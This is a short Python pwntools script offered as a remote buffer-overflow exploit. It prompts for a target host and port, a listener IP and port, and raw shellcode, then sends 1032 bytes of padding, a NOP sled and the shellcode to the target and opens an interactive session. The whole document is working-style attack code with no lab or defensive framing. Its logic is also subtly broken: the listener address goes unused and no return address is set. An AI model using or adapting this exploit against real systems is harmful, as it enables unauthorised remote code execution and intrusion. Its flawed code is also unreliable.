from pwn import *

# Get user inputs with prompts
target_ip = input("Enter target IP address: ").strip()
target_port = int(input("Enter target port: ").strip())

attacker_ip = input("Enter your listener IP (LHOST): ").strip()
attacker_port = int(input("Enter your listener port (LPORT): ").strip())

# Ask user to enter shellcode as a hex string, e.g.
print("If you don't have a shellcode, generate it with scshellcodegenerator.")
shellcode_input = input("Enter your shellcode as hex string (e.g. \\xfc\\x48...): \n").strip()

# Convert shellcode string to bytes
try:
    shellcode = shellcode_input.encode('latin1').decode('unicode_escape').encode('latin1')
except Exception as e:
    print(f"Error parsing shellcode: {e}")
    exit(1)

# Buffer overflow parameters (adjust as needed)
buffer_size = 1024
offset_to_ret = 1032

# Construct payload without jmp_rsp_address
payload = b"A" * offset_to_ret          # Padding to reach return address
payload += b"\x90" * 32                 # NOP sled
payload += shellcode                    # User provided shellcode

def exploit():
    print(f"[+] Connecting to {target_ip}:{target_port}")
    try:
        conn = remote(target_ip, target_port)
        print("[+] Sending payload...")
        conn.send(payload)
        print("[+] Payload sent. Check your listener.")
        conn.interactive()
    except Exception as e:
        print(f"Connection failed: {e}")

if __name__ == "__main__":
    exploit()
